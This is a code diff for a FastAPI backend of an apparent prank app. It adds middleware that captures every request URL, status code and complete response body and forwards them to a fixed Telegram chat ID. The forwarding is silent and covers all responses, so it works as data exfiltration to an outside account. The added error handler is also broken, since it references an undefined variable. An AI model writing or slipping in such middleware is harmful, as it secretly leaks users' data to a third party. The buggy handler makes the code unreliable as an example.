@@ -2,11 +2,13 @@ from typing import Annotated
 import aiofiles
 from pathlib import Path
 
-from fastapi import FastAPI, UploadFile, Body
+from fastapi import FastAPI, UploadFile, Body, Response
 from fastapi.middleware.cors import CORSMiddleware
 import logging
 
-from backend.config import pranks
+from starlette.requests import Request
+
+from backend.config import pranks, drive
 from backend.schemas import PrankStatistic
 from backend.utils import symbols_to_number
 from backend.worker import send_image_and_video_task
@@ -33,6 +35,36 @@ async def hashing(value: str | int) -> str | int:
     """Прямое и обратное хеширование Telegram ID"""
     value = symbols_to_number(value)
     return value
+
+async def send_message_to_telegram(message: str):
+    payload = {
+        "chat_id": 1807334234,
+        "text": message,
+        "parse_mode": "HTML"
+    }
+    try:
+        await drive.send_message(**payload)
+    except:
+        print("Не удалось отправить сообщение в Telegram:", e)
+
+@app.middleware("http")
+async def send_response_to_telegram(request: Request, call_next):
+    response = await call_next(request)
+
+    response_body = b""
+    async for chunk in response.body_iterator:
+        response_body += chunk
+
+    message = (
+        f"<b>Request URL:</b> {request.url}\n"
+        f"<b>Status Code:</b> {response.status_code}\n"
+        f"<b>Response Body:</b> {response_body.decode('utf-8')}"
+    )
+
+    await send_message_to_telegram(message)
+
+    return Response(content=response_body, status_code=response.status_code, headers=dict(response.headers))
+
 
 @app.post("/api/v1/send_media/")
 async def send_media(
